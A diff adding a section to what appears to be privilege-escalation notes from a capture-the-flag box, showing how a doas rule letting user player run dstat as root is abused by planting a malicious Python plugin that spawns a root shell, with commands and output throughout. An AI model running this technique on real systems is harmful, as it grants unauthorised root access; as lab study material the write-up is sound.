@@ -64,3 +64,48 @@ Once you find a suspicious binary with SUID, check it on https://gtfobins.github
 > - File reads/writes
 > - Spawning shells
 > - Privilege escalation (SUID, sudo, etc.)
+
+____
+
+
+
+### SUID (doas)
+find the doas config file
+
+```bash
+find / -name doas.conf 2>/dev/null
+```
+
+If we read this configuration file, we see that the user account player has the privileges to run `/usr/bin/dstat` as root without a password.
+
+```bash
+player@soccer:~$ cat /usr/local/etc/doas.conf 
+permit nopass player as root cmd /usr/bin/dstat
+```
+
+Next, we need to check the location of `dstat` to create a malicious plugin. `dstat` supports custom plugins, and since we have permission to run this software as root via `doas` without needing a password, we can achieve privilege escalation through this malicious plugin to create a reverse shell or spawn a shell as `root`.
+
+```bash
+player@soccer:~$ find / -type d -name dstat 2>/dev/null
+/usr/share/doc/dstat
+/usr/share/dstat
+/usr/local/share/dstat
+```
+
+This will drop into Bash for an interactive shell.
+
+Looking at the list of locations, I can obviously write to `~/.dstat`, but when run with `doas`, it’ll be running as root, and therefore won’t check `/home/player/.dstat`. Luckily, `/usr/local/share/dstat` is writable.
+
+```bash
+echo -e 'import os\\n\\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_0xdf.py
+
+```
+
+With that in place, I’ll invoke `dstat` with the `0xdf` plugin:
+
+```bash
+player@soccer:~$ doas /usr/bin/dstat --0xdf
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
+  import imp
+root@soccer:/home/player#
+```
